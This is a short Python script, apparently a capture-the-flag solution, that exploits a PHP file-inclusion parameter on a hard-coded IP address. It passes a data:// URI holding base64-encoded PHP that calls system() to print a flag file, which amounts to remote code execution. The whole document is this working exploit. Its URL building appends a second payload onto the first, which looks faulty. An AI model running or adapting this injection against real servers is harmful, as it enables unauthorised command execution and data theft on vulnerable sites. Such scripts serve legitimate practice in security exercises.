import requests
import base64

url = r"http://61.147.171.105:53664/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik7ID8+"

mid = r""

payload = r"PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg=="

url = url + mid + payload

response = requests.get(url)

response.encoding = "utf-8"

print(response.text)

# headers = response.headers
# for key, value in headers.items():
#     print(f"{key}: {value}")
